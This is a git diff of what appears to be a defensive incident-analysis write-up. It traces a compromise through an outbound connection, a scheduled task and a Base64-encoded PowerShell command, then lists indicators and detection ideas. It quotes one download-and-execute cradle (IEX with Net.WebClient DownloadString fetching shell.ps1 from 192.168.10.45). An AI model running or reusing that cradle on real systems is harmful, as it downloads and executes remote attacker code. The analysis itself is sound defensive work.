@@ -36,8 +36,7 @@ Using search functionality, the malicious IP was located:
 
 This revealed an outbound connection from a system process to a known malicious endpoint.
 
-📸  
-![Network Connection](screenshots/network_connection.png)
+
 
 ---
 
@@ -70,3 +69,43 @@ A suspicious PowerShell command was identified using Base64 encoding.
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.45/shell.ps1')
+
+
+
+🔍 Payload Analysis
+
+The decoded command reveals:
+
+Use of IEX (Invoke-Expression) to execute code in memory
+Retrieval of a remote script from a malicious server
+Likely execution of additional payloads
+
+
+🔗 Attack Chain Summary
+Suspicious process initiates outbound HTTP connection
+Communication established with malicious IP (192.168.10.45)
+Persistence created via scheduled task (schtasks.exe)
+PowerShell executes encoded command
+Remote payload is downloaded and executed
+
+👉 This behavior strongly indicates Command-and-Control (C2) activity and persistent system compromise.
+
+
+⚠️ Indicators of Compromise (IOCs)
+IP Address: 192.168.10.45
+Protocol: HTTP (Port 80)
+Technique: Base64-encoded PowerShell execution
+Persistence: Scheduled Task (schtasks.exe)
+Payload: Remote script execution
+
+
+
+🛡️ Detection & Mitigation Ideas
+Monitor outbound traffic to suspicious IP addresses
+Alert on PowerShell usage with -EncodedCommand
+Detect abnormal usage of schtasks.exe
+Implement application whitelisting
+Strengthen logging for process creation events
+
+
+
